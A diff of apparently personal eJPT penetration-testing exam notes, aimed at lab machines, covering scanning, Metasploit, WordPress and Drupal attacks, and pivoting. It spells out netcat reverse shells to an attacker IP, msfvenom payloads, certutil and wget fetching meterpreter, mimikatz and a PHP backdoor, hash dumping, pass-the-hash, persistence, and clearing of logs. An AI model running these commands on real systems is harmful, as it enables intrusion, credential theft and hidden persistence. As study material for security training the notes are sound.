@@ -1,13 +1,59 @@
+![[Pasted image 20251011144605.png]]
 
-ADD PAYLOADS FOR WINDOWS AND LINUX SYSTEMS FROM MSFVENOM
+
+
+
+
+
+![[Pasted image 20251019211628.png]]
+
+
 # Exam Tips:
 
-ENSURE I PUT THE DRUPAL NOTES HERE
-
-- Make yourself familiar with Webdev platforms like "Drupal" and "Wordpress" and how to attack those.
-	- Make sure to use WPSCAN
-- crucial to submit the flags as soon as you find it as they change after each reset.
+- Group all questions together that relate to the same server and answer them before moving on 
 - **Use the exclusion method** for Multi-choice questions. You know there’s only one right answer, so the other three must be wrong.
+   - crucial to submit the flags as soon as you find it as they change after each reset.
+   -  Make yourself familiar with Webdev platforms like "Drupal" and "Wordpress" and how to attack those.
+	- Make sure to use WPSCAN
+- There are 5–6 machines in DMZ and 1–2 machines in the internal network
+- Just make sure you've completed the INE labs and maybe one or two machines to exploit WordPress and Drupal.
+- Hydra is important, especially with Rockyou.
+- For directory scanning use dirbuster not metasploit with /usr/share/wordlist/dirb/common.txt
+
+
+
+Protip for those who are having trouble upgrading their Linux sessions in Metasploit to a meterpreter session: 
+
+```
+use post/multi/manage/shell_to_meterpreter
+set PLATFORM_OVERRIDE linux
+set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp
+run
+```
+
+
+
+
+# Other Good Resources
+
+https://www.notion.so/eJPTv2-Complete-Cheat-sheet-7a9012246bec4d37a9aa3a31f57934cc
+
+https://github.com/jibranali142/eJPT-Exam-Resources/blob/main/eJPT%20Solution.pdf
+
+https://github.com/xonoxitron/INE-eJPT-Certification-Exam-Notes-Cheat-Sheet
+
+https://pjdeepakkumar.gitbook.io/ejptv2
+
+- [**CrackStation**](https://crackstation.net/)
+- [**CyberChef**](https://cyberchef.org/)
+- [**GTFOBins**](https://gtfobins.github.io/)
+- [**HackTricks**](https://book.hacktricks.xyz/)
+- [**Hash Analyzer**](https://www.tunnelsup.com/hash-analyzer/)
+- [**Nmap NSE Doc**](https://nmap.org/nsedoc/scripts/)
+- [**PayLoadAllTheThing**s](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [**Reverse Shell Generator**](https://www.revshells.com/)
+- [**Upgrade a Linux reverse shell to a fully usable TTY shell**](https://zweilosec.github.io/posts/upgrade-linux-shell/)
+
 
 # TryHackMe Machines
 
@@ -202,6 +248,13 @@ Nmap
 ```
 nmap -sn 192.168.1.1      # Pings all IPs within the subnet and shows only those that respond
 ```
+
+Netdiscover
+```
+netdiscover -i eth0 -r 192.168.2.0/24
+```
+
+
 ## Host Discovery 
 
 Nmap
@@ -213,9 +266,13 @@ nmap -sn -v -T4 10.2.4.5   # Only tells you whether the host is up; does NOT sca
 nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 10.2.4.5   # Quick scan focusing on likely exploitable ports for the exam
 ```
 
+
+
+
 ## Banner Grabbing 
 
 Netcat banner grab
+Because some services cant be detected with NMAP ensure to use this 
 ```
 nc 192.105.220.2 22   # Connects to port 22 and retrieves the banner (service/version info)
 ```
@@ -238,9 +295,7 @@ dnsrecon -d hackersploit.org
 ```
 ## Directory Brute Force
 
-
 Gobuster
-
 ```
 # Basic directory scan
 gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt   # Scan directories
@@ -256,7 +311,7 @@ Dirbuster
 
 ```
 # Basic directory scan
-dirb http://target.com /usr/share/wordlists/dirb/common.txt   # Scan target.com using common wordlist
+dirb http://192.168.100.50 /usr/share/wordlists/dirb/common.txt   # Scan target.com using common wordlist
 
 # Scan for specific file extensions
 dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt   # Scan php, html, txt files
@@ -370,6 +425,23 @@ Potentially even below is enough to scan most the needed ports
 nmap -sS -sV -O -sC -T4 192.145.12.4 
 ```
 
+
+
+UDP Scan ports 1-250
+```
+nmap demo.ine.local -p 1-250 -sU
+```
+
+UDP Service scan 
+```
+nmap demo.ine.local -p 134,177,234 -sUV
+```
+
+or 
+
+```
+nmap demo.ine.local -T4 -sU -p 161 -A
+```
 ## Metasploit Port Scanning 
 
 ```
@@ -401,7 +473,7 @@ run
 ```
 
 
-## SMB 
+## SMB - 445
 
 Typical port: 445
 
@@ -416,7 +488,7 @@ sudo nmap -p 445 -sV -sC -O <TARGET_IP>   # Detects service/version, runs defaul
 
 # ----------------------
 # SMB Protocol & Security Mode
-# ----------------------
+# ---------------------
 nmap -p 445 --script smb-protocols <TARGET_IP>          # Detects SMB protocol versions supported
 nmap -p 445 --script smb-security-mode <TARGET_IP>      # Checks SMB security level (e.g., signing)
 
@@ -482,6 +554,8 @@ SMB Client Connections
 smbclient -L <TARGET_IP> -N                          # List shares (NULL/anonymous session)
 smbclient -L <TARGET_IP> -U <USER>                   # List shares with authentication
 smbclient //<TARGET_IP>/<USER> -U <USER>             # Connect to user share
+or
+smbclient//<Target_IP>//<SHARENAME>                  # Connect to anon share
 smbclient //<TARGET_IP>/admin -U admin               # Connect to admin share
 smbclient //<TARGET_IP>/public -N                    # Connect to public share (NULL session)
 
@@ -679,7 +753,7 @@ exploit
 ```
 
 ## SQL
-3
+
 Enumeration with NMAP 
 ```
 # Nmap - MySQL (MariaDB) Checks (port 3306)
@@ -1044,7 +1118,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 echo os.system('/bin/bash')
 /bin/sh -i
 /usr/bin/script -qc /bin/bash /dev/null
-perl -e 'exec "/bin/sh";'
+./'
 perl: exec "/bin/sh";
 ruby: exec "/bin/sh"
 lua: os.execute('/bin/sh')
@@ -1120,9 +1194,30 @@ nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
 # - Some netcat builds differ: -e may be unavailable for security builds. On Windows use the nc.exe that supports -e.
 
 ```
+
+## Compiling Exploits
+```
+
+sudo apt -y install mingw-w64 gcc
+
+## Windows Target
+searchsploit VideolAN VLC SMB
+searchsploit -m 9303
+# Compile for x64
+x86_64-w64-mingw32-gcc 9303.c -o exploit64.exe
+# Compile for x86 (32-bit)
+i686-w64-mingw32-gcc 9303.c -o exploit32.exe
+
+## Linux Target
+searchsploit Dirty Cow
+searchsploit -m 40839
+gcc -pthread 40839.c -o dirty_exploit -lcrypt
+```
+
+
 ## Host Exploits - Windows
 
-### IIS WEBDAV
+### IIS WEBDAV  - Port 80
 
 
 To see if a webdav folder is present on the server use the following command which will potentially point out the presence of this folder
@@ -1140,6 +1235,23 @@ davtest -auth bob:password_123321 -url http://demo.ine.local/webdav #example
 
 cadaver [OPTIONS] <URL>  
 # A command-line WebDAV client (like an FTP client) used to interact with the WebDAV server (upload, download, delete, move files, etc.).
+
+
+# Upload shell to webpage
+put /usr/share/webshells/asp/webshell.asp
+ls
+
+
+# Launch the shell on the webpage
+
+dir C:\
+type C:\flag.txt
+
+```
+
+
+```
+
 ```
 
 
@@ -1180,7 +1292,7 @@ shell
 
 
 
-### IIS/FTP
+### IIS/FTP - Port 80 , Port 21
 
 ```
 nmap -sV -sC -p21,80 <TARGET_IP>
@@ -1215,7 +1327,10 @@ set LPORT <LOCAL_PORT>
 ```
 
 
-### SMB 
+use scanner/winrm/winrm_login
+set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+set PASS_FILE usr/share/wordlists/rockyou.txt.gz
+### SMB/NetBios - Port 445 and 139 
 
 
 ```
@@ -1283,7 +1398,7 @@ set RHOSTS <IP_ADDRESS>
 use auxiliary/scanner/smb/smb_ms17_010
 use exploit/windows/smb/ms17_010_eternalblue
 ```
-### RDP 
+### RDP - Port 3333
 
 ```
 # Global set
@@ -1317,11 +1432,11 @@ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr
 RDP Session with Linux
 ```
 #Using Credentials found with hydra
-xfreerdp /u:administrator /p:qwertyuiop /v:10.2.16.217:3333  
+xfreerdp /u:Administrator /p:swordfish /v:192.168.100.55:3389  
 
 ```
 
-### WinRM
+### WinRM - 5985
 
 ```
 # Check RM is running on target
@@ -1363,6 +1478,7 @@ use auxiliary/scanner/winrm/winrm_auth_methods
 # Brute force WinRM login
 search winrm_login
 use auxiliary/scanner/winrm/winrm_login
+set RHOSTS <TARGET_IP>
 set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
 set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
 
@@ -1380,7 +1496,7 @@ set PASSWORD <PW>
 set FORCE_VBS true
 ```
 
-### HFS
+### HFS - Port 80
 
 ```
 search type:exploit name:rejetto
@@ -1391,8 +1507,9 @@ exploit
 
 ### TOMCAT
 
+
+Apache Tomcat 
 ```
-# APACHE TOMCAT
 search type:exploit tomcat_jsp
 use exploit/multi/http/tomcat_jsp_upload_bypass
 check
@@ -1400,6 +1517,30 @@ check
 set payload java/jsp_shell_bind_tcp
 set SHELL cmd
 run
+
+# This gives us a shell but not meterpreter
+```
+
+
+Tomcat Meterpreter session
+```
+
+# This is a payload file that we will transfer on to the system and then we'll use it to get a meterpreter session.
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local-ip> LPORT=1234 -f exe > meterpreter.exe 
+sudo python -m SimpleHTTPServer 80                                 # Set up server 
+certutil -url http://<local-ip>/meterpreter.exe meterpreter.exe    # Download the file 
+
+
+# Set Up Multi Handler with another metasploit session
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <local-ip>
+set LPORT
+run
+
+# Run the meterpreter exe on the target to gain the session 
+./meterpreter.exe
+
 ```
 
 ### OpenSSH 
@@ -1731,7 +1872,7 @@ Meterpreter Enumeration
 getuid
 sysinfo
 show_mount
-cat C:\\Windows\\System32\\eula.txt
+cat C:\Windows\System32\eula.txt
 getprivs
 pgrep explorer.exe
 migrate <PROCESS_ID>
@@ -1811,6 +1952,7 @@ ps aux                   # List running processes
 env                      # Print environment variables
 ls /                     # Enumerate top directories 
 ls -l /home              # Enumerate users
+sudo -l                  # View which sudo commands the current user can run 
 
 ```
 
@@ -1997,6 +2139,11 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -R
 
 ## Linux Privilege Escalation 
 
+
+ Found an executable binary file that could be executed by everyone, so clearly I could use “sudo” and “GTFO bin” to escalate it. But I only had a “www” account which was not in the sudo group.
+
+ **there must be a credential stored somewhere**! So I went back to the browser and googled that web application. Luckily, I found the location where the application stores credentials. And **I did find a password** there! Turned out that the password belonged to a user who was in the sudo group.
+
 ### Chrootkit
 
 Chrootkit 
@@ -2070,14 +2217,38 @@ cp /bin/bash <BINARY>
 ```
 
 
+## Windows Credential Dumping and Hash Cracking
 
 
-
-## Windows Credential Dumping
-
+Start postgresql to allow database  to allow credentials to be stored 
 
 ```
-# Creds dumping - Meterpreter - after having meterpreter access to target
+/etc/init.d/postgresql start
+```
+
+
+Meterpeter  using lsass 
+```
+sysinfo
+getuid
+pgrep lsass
+migrate <explorer_PID>
+getprivs
+```
+
+Alternative method to crack dumped hashes
+```
+migrate -N lsass.exe
+hashdump
+use auxiliary/analyze/crack_windows
+set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+exploit
+creds
+```
+
+
+Meterpreter Kiwi
+```
 load kiwi
 creds_all # Dump Administrator NTLM hash using Kiwi extension
 lsa_dump_sam   # Extract all the users NTLM hash using Kiwi.
@@ -2109,7 +2280,7 @@ sekurlsa::logonPasswords
 
 Pass the Hash Attack
 ```
-# sekurlsa::logonPasswords
+# With a session that we have a meterpreter shell on and gotton the admin hash 
 background
 search psexec
 use exploit/windows/smb/psexec
@@ -2119,12 +2290,18 @@ set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
 exploit
 ```
 
+![[Pasted image 20251015203808.png]]
 
-## Linux Credential Dumping
+
+Command using NTLM hash
+```
+crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
+```
+
+## Linux Credential Dumping and Hash Cracking
 
 
-Metasploit Hash Dumping
-
+Metasploit Hash Dumping modules
 ```
 use post/linux/gather/hashdump
 use post/multi/gather/ssh_creds
@@ -2134,17 +2311,395 @@ use post/linux/gather/pptpd_chap_secrets
 set SESSION 1
 ```
 
+Post exploitation hash dumping and cracking 
+```
+cat /etc/passwd
+sudo cat /etc/shadow
 
+# METASPLOIT (once exploited)
+use post/linux/gather/hashdump
+set SESSION <NUMBER>
+
+use auxiliary/analyze/crack_linux
+set SHA512 true
+run
+```
+
+
+```
+cat /etc/shadow
+
+# Metasploit
+use post/linux/gather/hashdump
+
+john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Hashcat
+hashcat --help | grep 1800
+hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
+```
 
 ## Shells
 
-## Pivoting/Lateral Movement 
+Different ways to spawn shells in Linux
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+/usr/bin/script -qc /bin/bash /dev/null
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+IRB: exec "/bin/sh"
+vi: :!bash
+vi: :set shell=/bin/bash:shell
+nmap: !sh
+```
+
+
+Linux searching for usable shells 
+```
+cat /etc/shells
+    # /etc/shells: valid login shells
+    /bin/sh
+    /bin/dash
+    /bin/bash
+    /bin/rbash
+
+cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done  # Check permissions each shell has
+
+
+# We can use any shell with the permission `lrwxrwxrwx` for escalation.
+find / -perm -4000 2>/dev/null        # Check for executables with the SUID bit 
+
+find / -exec /bin/rbash -p \; -quit   # Spawn a root shell 
+ 
+/bin/bash -i
+/bin/sh -i
+```
+
+
+Shells using Netcat
+```
+# NETCAT - Install
+sudo apt update && sudo apt install -y netcat
+# or upload the nc.exe on the target machine
+
+nc <TARGET_IP> <TARGET_PORT>
+nc -nv <TARGET_IP> <TARGET_PORT>
+nc -nvu <TARGET_IP> <TARGET_UDP_PORT>
+
+## NC Listener
+nc -nvlp <LOCAL_PORT>
+nc -nvlup <LOCAL_UDP_PORT>
+
+## Transfer files to target machine
+# Target machine
+nc.exe -nvlp <PORT> > test.txt
+# Attacker machine
+echo "Hello target" > test.txt
+nc -nv <TARGET_IP> <TARGET_PORT> < test.txt
+```
+
+Bind Shells
+```
+## Target Win machine - Bind shell listener with executable cmd.exe
+nc.exe -nvlp <PORT> -e cmd.exe
+## Attacker Linux machine
+nc -nv <TARGET_IP> <PORT>
+
+## Target Linux machine - Bind shell listener with /bin/bash
+nc -nvlp <PORT> -c /bin/bash
+## Attacker Win machine
+nc.exe -nv <TARGET_IP> <TARGET_PORT>
+```
+
+Reverse Shells 
+```
+## Attacker Linux machine
+nc -nvlp <PORT>
+## Target Win machine
+nc.exe -nv <ATTACKER_IP> <ATTACKER_PORT> -e cmd.exe
+
+## Attacker Linux machine
+nc -nvlp <PORT>
+## Target Linux machine
+nc -nv <ATTACKER_IP> <ATTACKER_PORT> -e /bin/bash
+```
+
+
+TTY Shells 
+```
+/bin/bash -i     # start an **interactive** Bash shell (reads interactive startup files and gives you a tty)
+/bin/sh -i       # start an **interactive** sh-compatible shell (often a lighter shell like dash; also gives a tty)
+SHELL=/bin/bash script -q /dev/null   # run `script` with SHELL set to /bin/bash; `script -q /dev/null` allocates a pseudo-tty quietly and discards the session recording (useful for forcing a pty)
+/bin/bash -i     # (duplicate of first line) start an interactive Bash shell
+
+# Setup environment variables
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   # set the PATH used to locate executables (here overriding PATH to common system directories)
+export TERM=xterm   # tell programs the terminal type/feature set (info used by ncurses, editors, etc.)
+export SHELL=/bin/bash   # set the SHELL environment variable to indicate the preferred shell (used by some programs/scripts)
+```
+
+Python Shells
+
+```
+python --version
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+## Fully Interactive TTY
+# Background (CTRL+Z) the current remote shell
+stty raw -echo && fg
+# Reinitialize the terminal with reset
+reset
+```
+
+Python3 TTY Shell 
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Background CTRL+Z
+stty raw -echo && fg
+# ENTER
+export SHELL=/bin/bash
+export TERM=screen
+stty rows 36 columns 157
+# stty -a to get the rows & columns of the attacker terminal
+reset
+```
+
+Perl Shell
+```
+perl -h
+perl -e 'exec "/bin/bash";'
+```
 
 ## Transferring Files 
 
+```
+sudo python -m SimpleHttpServer 80
+```
+
+Set up a listener 
+```
+msfconsole 
+use multi/handler
+set payload windows/x86/meterpreter/reverse_tcp 
+show options
+set LHOST Attacker
+set LPORT 1234 (same as payload)
+
+# Browse to IP and see hosted file 
+```
+
+
+Transferring Netcat to windows
+```
+cd /usr/share/windows-binaries
+python -m SimpleHTTPServer 80   # Python2
+python3 -m http.server 80       # Python3
+
+
+# Find Kali IP address
+ipconfig
+
+certutil -urlcache -f http://<KALI_IP>/nc.exe nc.exe
+
+#Start Listener on Windows
+nc.exe -nvlp 1234 -e cmd.exe
+
+# Start Listener on Kali (attacker) 
+nc -nv 10.0.23.27 1234
+
+```
+
+```
+# Exploit a system 
+Transfer mimikatz
+cd /usr/share/windows-resources/mimikatz/x64
+python3 -m http.server 80
+
+# Navigate back to a meterpreter session
+cd C:\\
+mkdir Temp
+cd temp
+# Gain a shell on the target and transfer
+shell
+certutil -urlcache -f http://10.10.41.3/mimikatz.exe mimikatz.exe
+```
+
+Transfer webshell to Linux machine
+```
+cd /usr/share/webshells/php/
+python3 -m http.server 80
+
+# On the opened command shell on the system 
+wget http://192.197.103.2/php-backdoor.php
+/bin/bash -i
+```
+
+Set up webserver to serve files
+```
+python -V
+python3 -V
+py -v # on Windows
+
+# Python 2.7  - Make sure that you are CD into the folder we want to server files from 
+python -m SimpleHTTPServer <PORT_NUMBER>
+
+# Python 3.7
+python3 -m http.server <PORT_NUMBER>
+
+# On Windows, try 
+python -m http.server <PORT>
+py -3 -m http.server <PORT>
+```
+
+
+## Pivoting/Lateral Movement 
+
+
+- You can also drop into a shell on the host you will be using for pivoting, launch powershell, and then get chatgpt to write you a powershell one-liner to scan a subnet for hosts that are alive. I find this to be quicker.
+- If you are pivoting from one network to another (like DMZ to internal), you will generally have a host that is dual-homed with two nics
+
+
+
+1. As you go through the computers you've discovered on the DMZ(external) network, run ifconfig/ipconfig on them. One of them will have multiple IP addresses.
+2. If you see multiple IP addresses, then you'll know that victim has access to the internal network.
+
+
+ **I guess you should be enumerating the new network as soon as you get access.** 
+
+
+powershell 1 liner to search for alive hosts (change IP address)
+```
+1..254 | ForEach-Object {
+  $ip = "192.168.0.$_"
+  $r  = Test-Connection -ComputerName $ip -Count 1 -ErrorAction SilentlyContinue
+  if ($r) { "$ip - $($r.ResponseTime)ms" } else { "$ip - no response" }
+}
+
+```
+
+Using Proxy Chains socks proxy 
+```
+# Within a meterpreter Session
+run autoroute -s 10.0.16.0/20
+cat /etc/proxychains4.conf
+
+	# Background session and set up socks proxy 
+background
+use auxiliary/server/socks_proxy
+show options
+set SRVPORT 9050
+set VERSION 4a 
+exploit
+jobs
+
+# Run NMAP on the second machine we couldnt access
+# TIP use this command as others will take forever - be sure we know what we want to scan? 
+proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
+
+# Use the netview command to see all shared reasources 
+sessions -i 1
+shell
+net view 10.2.20.131
+
+# Command above might not work 
+migrate -N explorer.exe
+shell
+net view 10.2.20.131
+
+# We can see that they both have a file share - map them with these commands from the originally compromised machine
+net use D: \\10.2.20.131\Documents
+net use K: \\10.2.20.131\K$
+
+```
+
+
+Pivoting Port forward (From Lab notes)
+
+```
+# After compromisng the first machine - run autoroute on the same subnet 
+run autoroute -s 10.2.31.0/20
+
+
+# Use metasploit to then scan the second target 
+use auxiliary/scanner/portscan/tcp
+set RHOSTS demo2.ine.local
+set PORTS 1-100
+exploit
+
+
+# After discovering that port 80 was open forward the remote port 80 to local port 1234 and grab the banner using Nmap
+sessions -i 1
+portfwd add -l 1234 -p 80 -r 10.2.27.45  <IP Address of the second machine we cant access>
+portfwd list
+
+# Use the same port and localhost to then scan using NMAP 
+nmap -sV -sS -p 1234 localhost
+# Then exploit the service 
+```
+
+
+Notes from Reddit if struggling 
+```
+**Meterpreter**  
+- setup msf with workspace  
+- db_nmap the victim 1  
+- use exploit to gain meterpreter session  
+- run ipconfig in meterpreter and gain the subnet network address  
+- `run autoroute -s <TARGET1_SUBNET_NETWORK with cidr>` *THIS IS ONLY APPLICABLE FOR MSFCONSOLE AND WON'T WORK WITH BROWSER i.e. targetIP:80 will not open in browser* *PORT-FORWARDING IS NEEDED*  
+- name the session victim 1 and put it in background  
+`use auxiliary/scanner/portscan/tcp`  
+`set RHOSTS <TARGET2_IP>`  
+`set PORTS 1-100`
+
+**Port Forwarding**  
+`sessions 1`  
+`portfwd add -l <your LOCAL_PORT> -p <TARGET2_PORT> -r <TARGET2_IP>`  
+`background`  
+`db_nmap -sS -sV -p <your LOCAL_PORT> localhost`
+
+**Target2 Exploitation**  
+use exploit/windows/http/badblue_passthru
+set payload windows/meterpreter/bind_tcp  
+set RHOSTS <TARGET2_IP> 
+set LPORT <LOCAL_PORT2>
+run
+```
+
+
+
+
+## Payloads 
+
+Windows
+32bit  
+Can be used on both 32 and 64bit 
+```
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f exe > /home/kali/Desktop/Payloadsx86.exe 
+```
+
+64bit
+```
+msfvenom -a x64 -p windows/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f exe > /home/kali/Desktop/Payloadsx64.exe 
+```
+
+Linux 
+Option to output into Elf or Binary file 
+32bit
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f elf > ~/Desktop/Payloads/payload32.exe
+```
+
+64bit
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Attacker IP LPORT=1234 -f elf > ~/Desktop/Payloads/payload64.exe 
+```
+
 
 ## Windows Persistence 
-
 
 ```
 # RDP - Meterpreter
@@ -2154,11 +2709,17 @@ use exploit/windows/local/persistence_service
 set payload windows/meterpreter/reverse_tcp
 set SESSION 1
 
-# Regain access
+# Regain access in another msfconsole to regain the access 
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST <LOCAL_IP>
-set LPORT <LOCAL_PORT>
+set LHOST <LOCAL_IP>   # Could use eth1 
+set LPORT <LOCAL_PORT> # use same port as previous 
+
+
+# Switch back to the active meterpreter session and reboot the machine 
+reboot 
+
+
 
 # Enabling RDP
 use post/windows/manage/enable_rdp
@@ -2167,7 +2728,6 @@ set SESSION 1
 ```
 
 ## Linux Persistence 
-
 
 Meterpreter - Manual
 ```
@@ -2213,20 +2773,299 @@ vim test.sh # add users to be added
 
 /etc/init.d/apache2 start
 cp test.sh /var/www/html
+```
 
+Manual With SSH key on the system. 
+```
+ssh user@host                               # connect to ssh
+ls -al                                      # find the .ssh file
+scp student@demo.ine.local:~/.ssh/id_rsa .  # Exit the session and copy the ssh key to our attack machine
+
+# SSH Back in and delete the wait file 
+ssh user@host  
+rm wait
+
+# Change the privledge of the rsa key and then use it to login 
+chmod 400 id_rsa
+ssh -i id_rsa student@demo.ine.local
 
 ```
 
-## Payloads 
+Cron job persistence
+
+```
+ps -eaf                                                                          # View if cron process is running 
+echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron          # Add python server to cron job to serve files in the students home directory 
+crontab -i cron
+crontab -l
+
+# Log out and login again to delete wait file 
+ssh student@demo.ine.local
+rm wait 
+
+# Scan ports - port 8000 should be open in the server 
+nmap -p- demo.ine.local 
+rm wait
+
+# Quick again use curl to interrogate the servers files on the victims machine and download
+curl demo.ine.local:8000
+curl demo.ine.local:8000/flag.txt
+```
 
 ## Clearing Tracks 
 
 Meterpreter
 ```
 clearenv
+
+## Cleanup Meterpreter RC File:
+cat /root/.msf4/logs/persistence/<CLEANING_SCRIPT>.rc
+background
+sessions 1
+resource /root/.msf4/logs/persistence/<CLEANING_SCRIPT>.rc
+run multi_console_command -r /root/.msf4/logs/scripts/getgui/<CLEANING_SCRIPT>.rc
+clearenv
 ```
+
+On linux
+```
+history -c
+```
+
+Clear bash history
+```
+cat /dev/null > ~/.bash_history
+```
+
+```
+# Windows C:\Temp - Metasploit e.g.
+cd C:\\
+mkdir Temp
+cd Temp # Clean this C:\Temp directory
+```
+
+
 # Web Application Penetration Testing
 
-## Attacks
+### Enumeration with Curl 
 
-## Shellshock with Burp Suite
+```
+curl -I <TARGET_IP>
+curl -X GET <TARGET_IP>
+curl -X OPTIONS <TARGET_IP> -v
+curl -X POST <TARGET_IP>
+curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
+curl -X PUT <TARGET_IP>
+```
+
+The Webdav module is enabled on the Apache Server, Webdav module allows file upload via the **PUT** method.
+
+ Uploading a file with the PUT method.
+```
+echo "Hello World" > hello.txt
+curl demo.ine.local/uploads/ --upload-file hello.txt
+```
+
+```
+# Attempt to upload file
+curl <TARGET_IP>/uploads/ --upload-file hello.txt
+# Delete file
+curl -X DELETE <TARGET_IP>/uploads/hello.txt -v
+```
+
+
+
+```
+nmap -sS -sV -p 80,443,3306 <TARGET_IP>
+
+# Dirbuster
+dirb http://<TARGET_IP>
+
+curl <TARGET_IP>/uploads/ --upload-file hello.txt
+curl -X DELETE <TARGET_IP>/uploads/hello.txt -v
+
+# Gobuster
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404
+
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+
+gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+```
+
+
+
+### Wordpress Enumeration 
+
+Check for 
+`/license.txt` or `/readme.html`
+
+Enumerate using wordpress to find plugins 
+```
+nmap -sV -p 80,443 \
+  --script http-wordpress-enum \
+  --script-args 'http-wordpress-enum.pluginsdb=/usr/share/nmap/nselib/data/wp-plugins.lst' \
+  target2.ine.local -oA wp-plugins-enum
+
+```
+
+```
+nmap -sV -p 80,443 --script=http-wordpress-enum,http-enum,http-server-header --script-args=http-wordpress-enum.paths={/} -oN nmap-wp-plugins.txt a<target ip>
+```
+
+
+
+Wordpress Version 
+```
+curl https://victim.com/ | grep 'content="WordPress'
+```
+
+```
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2   # Get Plugins
+
+
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2    #  Get Themes
+
+
+curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2   # Extract versions 
+
+
+```
+
+Wordpress ID brute force 
+You get valid users from a WordPress site by Brute Forcing users IDs:
+
+```s
+curl -s -I -X GET http://blog.example.com/?author=1
+```
+
+If the responses are **200** or **30X**, that means that the id is **valid**. If the the response is **400**, then the id is **invalid**.
+
+
+**wp-json**
+
+You can also try to get information about the users by querying:
+
+```
+curl http://blog.example.com/wp-json/wp/v2/users
+```
+
+**`/wp-login.php`** the **message** is **different** is the indicated **username exists or not**. 
+
+
+#### WPScan
+
+Best plugin scan
+```
+wpscan --url http://wordpress.local --enumerate p --plugins-detection mixed
+```
+
+```
+
+wpscan -h #List WPscan Parameters
+wpscan --update #Update WPscan
+#Enumerate WordPress using WPscan
+
+wpscan --url "http://wordpress.local" -e t #All Themes Installed
+wpscan --url "http://<TARGET_IP>" -e vt #Vulnerable Themes Installed
+wpscan --url "http://<TARGET_IP>"  -e p #All Plugins Installed
+wpscan --url "http://<TARGET_IP>"  -e vp #Vulnerable Themes Installed
+wpscan --url "http://<TARGET_IP>"  -e u #WordPress Users
+wpscan --url "http://<TARGET_IP>"  --passwords path-to-wordlist #Brute Force WordPress Passwords
+
+
+#Upload Reverse Shell to WordPress
+http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php
+
+
+
+```
+
+
+Bruteforce Wordpress with WPSCAN using a username file 
+
+```
+wpscan --url "http://target.blog/wp-admin.php" -U usernames -P /usr/share/wordlists/rockyou.txt
+```
+
+
+### Wordpress Exploits
+
+
+```
+searchsploit remote webapps wordpress
+```
+
+Backdoor upload using metasploit
+```
+use exploit/unix/webapp/wp_admin_shell_upload
+set USERNAME admin
+set PASSWORD admin
+set targeturi /wordpress
+exploit
+
+```
+
+Using metasploit to search and exploit for plugins 
+```
+search duplicator
+scanner/http/wp_duplicator_file_read
+set RHOSTS target2.ine.local
+exploit 
+```
+
+### Drupal Enumeration
+
+### Drupal Exploits 
+
+Drupal exploit walkthrough on INE 
+https://blog.pentesteracademy.com/lab-walkthrough-drupalgeddon-2-cve-2018-7600-93866c7ad03
+
+Read this for drupal
+https://github.com/xonoxitron/INE-eJPT-Certification-Exam-Notes-Cheat-Sheet
+
+
+
+In late March 2018, a critical vulnerability was uncovered in Drupal CMS. **Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1** versions were affected by this vulnerability.
+
+It allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or standard module configurations.
+
+A lot of PoC is available to exploit this vulnerability.
+
+[https://ine.com/blog/cve-2018-7600-drupalgeddon-2](https://ine.com/blog/cve-2018-7600-drupalgeddon-2)
+
+Metasploit Module 
